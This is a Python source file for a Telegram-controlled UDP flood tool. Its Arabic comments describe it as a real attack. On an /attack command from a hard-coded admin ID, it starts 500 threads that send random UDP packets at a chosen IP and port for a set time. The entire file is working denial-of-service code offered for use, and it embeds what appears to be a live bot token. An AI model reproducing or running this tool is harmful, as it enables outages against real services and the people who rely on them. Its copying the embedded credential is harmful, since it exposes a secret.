# -*- coding: utf-8 -*-
import telebot
import socket
import threading
import random
import time
import os

# --- معلوماتك ---
TOKEN = '8019764626:AAHW4KZ8ErK4uXigF0TPvsnwxauu0vEGqys'
ADMIN_ID = 8102610225

bot = telebot.TeleBot(TOKEN)

# دالة الهجوم الحقيقية (UDP Raw Flooder)
def real_attack(ip, port, duration):
    # إنشاء سوكيت UDP عالي السرعة
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # حزم صغيرة (64-1024 بايت) هي الأكثر فتكاً بالبورتات المفتوحة
    # لأنها تملأ طابور المعالجة في سيرفر الهدف بسرعة
    data = random._urandom(min(1024, random.randint(512, 1024)))
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            # إرسال الحزمة
            client.sendto(data, (ip, port))
            # لا يوجد 'sleep' هنا لضمان أقصى سرعة ممكنة
        except:
            pass
    client.close()

@bot.message_handler(commands=['start'])
def welcome(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "⚡ **النظام جاهز للعمل.**\nارسل الهدف كالتالي:\n`/attack IP PORT TIME`", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        args = message.text.split()
        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])

        bot.reply_to(message, f"🚀 **جاري بدء الهجوم الفعلي...**\n🎯 الهدف: `{target_ip}`\n🔌 المنفذ: `{target_port}`\n⏱️ المدة: `{duration}` ثانية\n🔥 القوة: **MAX (500 Threads)**", parse_mode='Markdown')

        # ليكون الهجوم "حقيقي" وقوي، سنفتح 500 خيط (Thread)
        # ملاحظة: السيرفر (VPS) يتحمل هذا الرقم، لكن الموبايل قد يعلق.
        for _ in range(500):
            th = threading.Thread(target=real_attack, args=(target_ip, target_port, duration))
            th.daemon = True
            th.start()

    except Exception as e:
        bot.reply_to(message, "⚠️ تأكد من الصيغة: `/attack IP PORT TIME`", parse_mode='Markdown')

if __name__ == "__main__":
    bot.infinity_polling()
